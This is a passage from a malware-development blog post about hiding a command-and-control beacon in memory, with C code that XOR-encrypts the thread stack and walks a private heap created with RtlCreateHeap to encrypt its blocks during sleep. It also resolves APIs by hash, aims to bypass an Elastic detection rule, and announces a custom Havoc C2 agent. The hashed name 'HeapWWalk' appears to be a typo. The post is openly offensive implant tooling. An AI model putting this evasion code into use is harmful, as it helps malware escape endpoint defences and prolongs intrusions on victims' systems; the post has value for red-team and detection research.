    <span class="n">PVOID</span> <span class="n">StackBase</span><span class="p">,</span>
    <span class="n">PVOID</span> <span class="n">StackLimit</span>
<span class="p">)</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span> <span class="n">PUCHAR</span> <span class="n">Ptr</span> <span class="o">=</span> <span class="n">StackLimit</span><span class="p">;</span> <span class="n">Ptr</span> <span class="o">&lt;</span> <span class="n">StackBase</span><span class="p">;</span> <span class="n">Ptr</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">Ptr</span> <span class="o">^=</span> <span class="mh">0xFF</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><p>Stack xor demo</p><p></p><p>You may want to use run sleepobf in another thread so that it can xor the stack of the main beacon thread, just be careful not to mess up the call stack</p><h2 id="heap"><span class="me-2">Heap</span><a href="https://oblivion-malware.xyz/posts/advanced-module-stomping-heap-stack-enc/#heap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>When dealing with the heap, we need to be cautious. If we use the return value from <a href="https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap">GetProcessHeap</a> or <code class="language-plaintext highlighter-rouge">PEB-&gt;ProcessHeap</code>, we will be using the <code class="language-plaintext highlighter-rouge">main</code> heap of the process. It’s certain that other threads may also be using the same heap, and if we obfuscate it, the threads will likely freeze, causing the process to crash. Another approach would be to enumerate all threads and suspend them, but I don’t like this idea, and I’m sure you understand why.</p><p>To solve this problem, we will create our own heap using <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtlcreateheap">RtlCreateHeap</a>.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>    <span class="n">PVOID</span> <span class="n">Heap</span> <span class="o">=</span> <span class="n">RtlCreateHeap</span><span class="p">(</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div><p>This way, we will have our own heap, and when we use functions like <a href="https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc">HeapAlloc</a> and others, we will pass our custom heap.</p><p>Now, we need to enumerate the blocks and get their size. We can use <a href="https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapwalk">HeapWalk</a>, which returns a structure of <a href="https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-process_heap_entry">PROCESS_HEAP_ENTRY</a>. The important members are <code class="language-plaintext highlighter-rouge">lpData</code>, which is the base address of the block, and <code class="language-plaintext highlighter-rouge">cbData</code>, which is the size of the heap block.</p><div class="language-c highlighter-rouge"><div class="code-header"> <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="n">FUNC</span> <span class="n">VOID</span> <span class="nf">HeapObf</span><span class="p">(</span> 
    <span class="n">PVOID</span> <span class="n">Heap</span>
<span class="p">)</span> <span class="p">{</span>
    <span class="n">BLACKOUT_INSTANCE</span>

    <span class="n">PROCESS_HEAP_ENTRY</span> <span class="n">HeapEntry</span>   <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">BYTE</span>               <span class="n">HeapKey</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x55</span> <span class="p">};</span> <span class="c1">// can be random generation</span>

    <span class="n">MmZero</span><span class="p">(</span> <span class="o">&amp;</span><span class="n">HeapEntry</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span> <span class="n">PROCESS_HEAP_ENTRY</span> <span class="p">)</span> <span class="p">);</span>

    <span class="k">typedef</span> <span class="n">WINBOOL</span> <span class="p">(</span><span class="o">*</span><span class="n">fHeapWalk</span><span class="p">)(</span><span class="n">HANDLE</span> <span class="n">hHeap</span><span class="p">,</span> <span class="n">LPPROCESS_HEAP_ENTRY</span> <span class="n">lpEntry</span><span class="p">);</span>
    <span class="n">fHeapWalk</span> <span class="n">pHeapWalk</span> <span class="o">=</span> <span class="n">LdrFuncAddr</span><span class="p">(</span> <span class="n">LdrModuleAddr</span><span class="p">(</span> <span class="n">H_MODULE_KERNEL32</span> <span class="p">),</span> <span class="n">HASH_STR</span><span class="p">(</span> <span class="s">"HeapWWalk"</span> <span class="p">)</span> <span class="p">);</span>

    <span class="n">pHeapWalk</span><span class="p">(</span> <span class="n">Heap</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">HeapEntry</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">HeapEntry</span><span class="p">.</span><span class="n">wFlags</span> <span class="o">&amp;</span> <span class="n">PROCESS_HEAP_ENTRY_BUSY</span> <span class="p">)</span> <span class="p">{</span>
        <span class="n">XorCipher</span><span class="p">(</span> <span class="n">HeapEntry</span><span class="p">.</span><span class="n">lpData</span><span class="p">,</span> <span class="n">HeapEntry</span><span class="p">.</span><span class="n">cbData</span><span class="p">,</span> <span class="n">HeapKey</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">HeapKey</span><span class="p">)</span> <span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div><p>Heap obuscated demo</p><p></p><p>Another approach that may be better than creating your own heap would be to create a wrapper function that allocates on the heap and put all allocations in a linked list <code class="language-plaintext highlighter-rouge">PLIST_ENTRY</code> and still use the process’s own Heap, an idea originally from <a href="https://x.com/shubakki">@bakki</a></p><h1 id="observation">Observation</h1><p>There are some improvements that could be made here, such as compile-time string encryption, obfuscating backup regions, using <code class="language-plaintext highlighter-rouge">indirect syscalls</code>, etc., but we’re focusing solely on memory evasion for now. We still need to bypass the Elastic rule I mentioned in the previous blog post <a href="https://oblivion-malware.xyz/posts/sleep-obf-foliage/">Evading detection in memory - Pt 1: Sleep Obfuscation - Foliage</a>.</p><p>I’m developing a custom agent for the <a href="https://github.com/HavocFramework/Havoc/">Havoc</a> C2 Framework, which will feature some of these even more sophisticated techniques and will be open source. I’ll share more about this project soon.</p><h1 id="reference-and-credits">Reference and credits</h1><ul><li><a href="https://bruteratel.com/release/2023/03/19/Release-Nightmare/">BRC4 release: Nightmare</a></li><li><a href="https://github.com/kyleavery/AceLdr">Aceldr - UDRL</a></li><li><a href="https://dtsec.us/2023-11-04-ModuleStompin/">Nigerald blog</a></li><li><a href="https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html">Module Shifting</a></li><li><a href="https://maldevacademy.com/">Maldev Academy</a></li><li><a href="https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c#L485">Havoc framework: sleep obf</a></li><li><a href="https://x.com/C5pider">5pider dev</a></li><li><a href="https://x.com/shubakki">Bakki dev</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="https://oblivion-malware.xyz/categories/malware-development/">Malware Development</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 "><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Evading%20detection%20in%20memory%20-%20Pt%202:%20Improving%20Module%20Stomping%20(Advanced%20Module%20Stomping)%20+%20Sleep%20Obfuscation%20with%20heap/stack%20encryption%20-%20Oblivion&amp;url=%2Fposts%2Fadvanced-module-stomping-heap-stack-enc%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Twitter" data-bs-original-title="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Evading%20detection%20in%20memory%20-%20Pt%202:%20Improving%20Module%20Stomping%20(Advanced%20Module%20Stomping)%20+%20Sleep%20Obfuscation%20with%20heap/stack%20encryption%20-%20Oblivion&amp;u=%2Fposts%2Fadvanced-module-stomping-heap-stack-enc%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Facebook" data-bs-original-title="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Fadvanced-module-stomping-heap-stack-enc%2F&amp;text=Evading%20detection%20in%20memory%20-%20Pt%202:%20Improving%20Module%20Stomping%20(Advanced%20Module%20Stomping)%20+%20Sleep%20Obfuscation%20with%20heap/stack%20encryption%20-%20Oblivion" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" aria-label="Telegram" data-bs-original-title="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" data-title-succeed="Link copied successfully!" data-bs-original-title="Copy link"> <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="https://oblivion-malware.xyz/tags/windows/">Windows</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>
</body></html>